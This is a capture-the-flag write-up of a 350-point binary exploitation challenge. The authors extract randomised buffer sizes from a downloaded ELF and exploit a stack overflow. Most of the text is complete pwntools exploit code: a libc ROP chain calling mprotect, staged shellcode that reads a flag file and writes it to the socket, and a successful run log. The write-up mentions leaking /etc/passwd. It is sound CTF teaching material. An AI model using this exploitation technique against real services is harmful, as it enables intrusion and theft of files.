### Solved by superkojiman, barrebas, and Swappage

This was a 350 point challenge that barrebas, Swappage, and I tackled

We're given an IP address and a port to connect to. Connecting to the port dumped what looked like an ELF binary. I saved the output and sure enough, it was a simple program that received input from the user on a port and echoed it back. 

Swappage figured out that the server probably started an instance of this particular program it sent us, listening on the specifed port for a short period of time. He also noticed that the binary the server sent us was always different. 

Doing a quick comparison, I found that the port number, the number of bytes the binary would receive from the user, and the size of the stack frame always changed. This in turn meant that in some cases, the binary was exploitable when the number of bytes received was larger than the size of the buffer. I hacked out the following to grab the randomly changing values from the binary.

```python
#!/usr/bin/env python
from pwn import *

print "saving binary as \"mybin\""
f = open("mybin", "w")

r = remote("52.20.10.244", 8888)
d  = r.recvall()

f.write(d)
f.close()

e = ELF("mybin")

bufsiz = e.read(0x400781, 7)[3:]
print "bufsiz:", bufsiz

port = e.read(0x4007d4, 3)[1:]
toread = e.read(0x40082e, 3)[1:]

bufsiz = u32(bufsiz) - 8            # bufsiz is size of stack frame - 8
port = u32(port + "\x00\x00")
toread = u32(toread + "\x00\x00")

print "port:", port
print "toread:", toread
print "bufsiz:", bufsiz

# see if this binary is exploitable
if toread > bufsiz:
    print "exploitable!"
else:
    print "can't exploit this one."
```

This worked some times. In some instances the addresses were totally different. I didn't bother to figure out what was going on since it wasn't hard to get this particular case working and I wanted to move on to the exploitation. 

We were informed that ASLR was disabled on the server, and there was no stack canary. The only obstruction was NX. I grabbed libc from the server hosting Pwn100 in the hopes that it was the same one used for this challenge. I went to bed and handed the challenge off to barrebas. 

Barrebas figured out how to leak libc's base address, and from there he was able to modify the exploit to leak more data out. Thanks to that, we had access to a wider range of ROP gadgets and the functions in libc. He also found the socket file descriptor used by the server to communicate with us. 

We initially tried to get a shell, however nothing was working. A reverse shell I setup would connect briefly and then disconnect before I could do anything. Locally it worked, but remotely it was having issues. So much for the easy route. Based off Pwn100, I assumed the flag was in file called flag, and so I started to put together an exploit that would open the flag file, read it, and then write it back to us.

Due to NX, the stack wasn't executable. I decided to use mprotect() on addresses 0x00601000 to 0x00602000 to make it RWX. The plan was to copy the second stage payload in there which would perform the actual open/read/write of the flag. 

```
#!/usr/bin/env python
from pwn import *
import time
import sys

context(os="linux", arch="amd64")

print "saving binary as \"mybin\""
f = open("mybin", "w")

r = remote("52.20.10.244", 8888)
d  = r.recvall()

f.write(d)
f.close()

e = ELF("./mybin")


bufsiz = e.read(0x400781, 7)[3:]
port = e.read(0x4007d4, 3)[1:]
toread = e.read(0x40082e, 3)[1:]

bufsiz = u32(bufsiz) - 8            # bufsiz is size of stack frame - 8
port = u32(port + "\x00\x00")
toread = u32(toread + "\x00\x00")

print "port:", port
print "toread:", toread
print "bufsiz:", bufsiz

# see if this binary is exploitable
if toread > bufsiz:
    print "exploitable!"

    r = remote("52.20.10.244", port)

    buf = ""
    buf += "A"*(bufsiz-len(buf))

    base = 0x400690
    write_at_got = 0x601018
    oneshotrce = 0x4652c

    # libc_base_offset 0x1f4a0
    # 0x000c1e55 : syscall ; ret
    # 0x000293b8 : pop rax; ret
    # 0x00005365 : pop rsi; ret
    # 0x0009da40 : pop rdx; ret
    # 0x0000367a : pop rdi; ret

    libc_base = 0x7ffff7a15000      # remote

    syscal = p64(libc_base + 0xc1e65)
    binsh = p64(libc_base +  0x000000000017CCDB)

    libc_base += 0x1f4a0
        
    poprax = p64(libc_base + 0x000293b8)
    poprsi = p64(libc_base + 0x00005365)
    poprdi = p64(libc_base + 0x0000367a)
    poprdx = p64(libc_base + 0x0009da40)

    # rop chain starts here

    # mprotect chain
    buf += poprax
    buf += p64(0xa)
    buf += poprdi
    buf += p64(0x00601000)
    buf += poprsi
    buf += p64(0x1000)
    buf += poprdx
    buf += p64(0x7)
    buf += syscal

    # read chain: read shellcode from user
    buf += poprax
    buf += p64(0x0)
    buf += poprdi
    buf += p64(6)
    buf += poprsi
    buf += p64(0x00601000)      # write shellcode here
    buf += poprdx
    buf += p64(0x100)
    buf += syscal

    # return to payload
    buf += p64(0x00601000)

    print "sending stage 1"
    r.send(buf)

    print "hit enter to send stage 2"
    raw_input()

    # read flag
    stage2 = ""
    stage2 += asm("mov rax, 0x0")
    stage2 += asm("mov rdi, 0x6")
    stage2 += asm("mov rsi, 0x00601090")
    stage2 += asm("mov rdx, 0x10")
    stage2 += asm("syscall")

    # open flag
    stage2 += asm("mov rax, 0x2")
    stage2 += asm("mov rdi, 0x00601090")
    stage2 += asm("mov rsi, 0x0")
    stage2 += asm("syscall")
    stage2 += asm("mov r15, rax")

    # read flag from fd
    stage2 += asm("mov rax, 0x0")
    stage2 += asm("mov rdi, r15")
    stage2 += asm("mov rsi, 0x00601200")
    stage2 += asm("mov rdx, 0x1000")
    stage2 += asm("syscall")
    
    # write flag to sockfd
    stage2 += asm("mov rax, 0x1")
    stage2 += asm("mov rdi, 0x6")
    stage2 += asm("mov rsi, 0x00601200")
    stage2 += asm("mov rdx, 0x1000")
    stage2 += asm("syscall")

    r.send(stage2)

    print "hit enter to send flag location"
    raw_input()
    r.send("/home/ctf/flag\x00")

    print r.recv()

else:
    print "can't exploit this one."
```

If you're wondering how I knew where the flag was, I initially didn't. I assumed it was in the same directory as the running binary but it wasn't. I initially used the exploit to leak the contents of /etc/passwd to find /home/ctf. 


I had to try the exploit several times. It worked best when the bytes read was greater than the buffer size by over 100 bytes. When it finally worked:

```plain
saving binary as "mybin"
[+] Opening connection to 52.20.10.244 on port 8888: Done
[+] Recieving all data: Done (8.75KB)
[*] Closed connection to 52.20.10.244 port 8888
[*] '/root/Desktop/pwn350/mybin'
    Arch:          amd64-64-little
    RELRO:         Partial RELRO
    Stack Canary:  No canary found
    NX:            NX enabled
    PIE:           No PIE
port: 18716
toread: 369
bufsiz: 200
exploitable!
[+] Opening connection to 52.20.10.244 on port 18716: Done
sending stage 1
hit enter to send stage 2

hit enter to send flag location

flag{c4nt_w4it_f0r_cgc_7h15_y34r}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00...
[*] Closed connection to 52.20.10.244 port 18716
```

Win! Flag is **flag{c4nt_w4it_f0r_cgc_7h15_y34r}**
